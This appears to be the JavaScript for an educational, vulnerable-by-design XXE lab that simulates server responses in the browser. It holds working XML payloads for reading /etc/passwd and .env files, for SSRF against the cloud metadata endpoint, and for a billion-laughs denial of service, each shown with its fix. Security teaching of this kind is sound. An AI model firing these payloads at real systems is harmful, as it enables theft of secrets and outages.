// VULNERABLE BY DESIGN — Educational purposes only
// Simulates XXE: the server parses XML with external entity processing enabled.
// We use the browser's DOMParser (which does NOT fetch real URLs) but simulate
// entity expansion to demonstrate the attack concept.

// Simulated file contents the "server" would read
const SIMULATED_FILES = {
  "file:///etc/passwd":     "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nalice:x:1001:1001::/home/alice:/bin/bash",
  "file:///.env":           "DB_HOST=localhost\nDB_PASS=hunter2secret\nJWT_SECRET=supersecret99\nAPI_KEY=sk-prod-a1b2c3d4",
  "http://169.254.169.254/latest/meta-data/": "ami-id\nhostname\niam/\ninstance-id\ninstance-type\nlocal-ipv4\npublic-ipv4\nsecurity-groups",
};

const PAYLOADS = {
  file: `<?xml version="1.0"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<invoice>
  <id>1001</id>
  <amount>250.00</amount>
  <note>&xxe;</note>
</invoice>`,

  env: `<?xml version="1.0"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///.env">
]>
<invoice>
  <id>1001</id>
  <amount>250.00</amount>
  <note>&xxe;</note>
</invoice>`,

  ssrf: `<?xml version="1.0"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<invoice>
  <id>1001</id>
  <amount>250.00</amount>
  <note>&xxe;</note>
</invoice>`,

  billion: `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<invoice>
  <id>1001</id>
  <amount>250.00</amount>
  <note>&lol5;</note>
</invoice>`,
};

document.querySelectorAll(".hint").forEach(h => {
  h.addEventListener("click", () => {
    document.getElementById("xmlInput").value = PAYLOADS[h.dataset.payload] || "";
  });
});

document.getElementById("xxeForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const xml         = document.getElementById("xmlInput").value.trim();
  const responseBox = document.getElementById("responseBox");
  const explanation = document.getElementById("explanationBox");

  responseBox.classList.remove("hidden");
  explanation.classList.remove("hidden");

  // Detect attack type
  const systemMatch  = xml.match(/SYSTEM\s+"([^"]+)"/);
  const isBillion    = /lolz|lol2|lol3/i.test(xml);
  const isXXE        = !!systemMatch;
  const systemTarget = systemMatch ? systemMatch[1] : null;

  if (isBillion) {
    // Billion laughs simulation
    responseBox.innerHTML =
      `<span class="dos">HTTP/1.1 500 Internal Server Error\n\n` +
      `Error: Out of memory — XML entity expansion exceeded limit.\n` +
      `Parser attempted to expand &lol5; → 10^5 = 100,000 "lol" strings.\n` +
      `A real billion-laughs payload uses 10 levels → 10^9 expansions.\n\n` +
      `Server process killed by OOM killer.</span>`;

    explanation.innerHTML = `
      <h3>Billion Laughs — XML DoS</h3>
      <p>Exponentially nested entity references force the parser to expand an astronomically large string, consuming all available memory.</p>
      <ul>
        <li>No external network access needed — the attack is self-contained in the XML.</li>
        <li>With 10 levels of nesting, a 1 KB document expands to ~3 GB in memory.</li>
        <li>The fix: disable DTD processing entirely, or set entity expansion limits in the parser config.</li>
      </ul>`;
    return;
  }

  if (isXXE && systemTarget) {
    const fileContents = SIMULATED_FILES[systemTarget];

    if (fileContents) {
      responseBox.innerHTML =
        `<span class="leak">HTTP/1.1 200 OK  ← XXE — entity resolved to file contents\n\n</span>` +
        `{\n  "id": "1001",\n  "amount": "250.00",\n  "note": "${escapeHtml(fileContents.replace(/\n/g, "\\n"))}"\n}`;

      const isSSRF = systemTarget.startsWith("http");
      explanation.innerHTML = `
        <h3>What happened? — XXE ${isSSRF ? "(SSRF via entity)" : "file read"}</h3>
        <p>The XML parser resolved the external entity <code>SYSTEM "${escapeHtml(systemTarget)}"</code> and embedded its contents into the parsed output.</p>
        <ul>
          ${isSSRF
            ? `<li>The <code>http://</code> entity caused the <em>server</em> to make an outbound HTTP request — this is SSRF via XXE.</li>
               <li>The AWS metadata endpoint <code>169.254.169.254</code> returns IAM credentials, instance identity, and network config.</li>`
            : `<li>The <code>file://</code> entity read a local file from the server's filesystem.</li>
               <li>Any file readable by the web server process (www-data) is accessible.</li>`}
          <li>The contents appeared in the API response in the <code>note</code> field — no other access needed.</li>
          <li>The fix: disable external entity processing in the XML parser. In most languages this is a single config option.</li>
        </ul>`;
    } else {
      responseBox.innerHTML =
        `<span class="leak">HTTP/1.1 200 OK — entity resolved but target not in simulated FS\n\n` +
        `Try: file:///etc/passwd  |  file:///.env  |  http://169.254.169.254/latest/meta-data/</span>`;
      explanation.innerHTML = `<h3>XXE detected — target not in simulated filesystem.</h3><p>Use the hint buttons to load a payload with a known target.</p>`;
    }
    return;
  }

  // Normal (no XXE)
  responseBox.innerHTML =
    `<span class="ok">HTTP/1.1 200 OK\n\n</span>` +
    `{\n  "status": "accepted",\n  "id": "1001",\n  "amount": "250.00",\n  "note": "Q4 consulting"\n}`;
  explanation.innerHTML = `
    <h3>Normal XML — no XXE payload detected.</h3>
    <p>To trigger XXE, add a DOCTYPE with an external entity. Click a hint button to load a pre-built payload, or add this to your XML:</p>
    <ul>
      <li>Define entity: <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code></li>
      <li>Reference it:  <code>&amp;xxe;</code> inside any element value</li>
    </ul>`;
});

function escapeHtml(s) {
  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
}
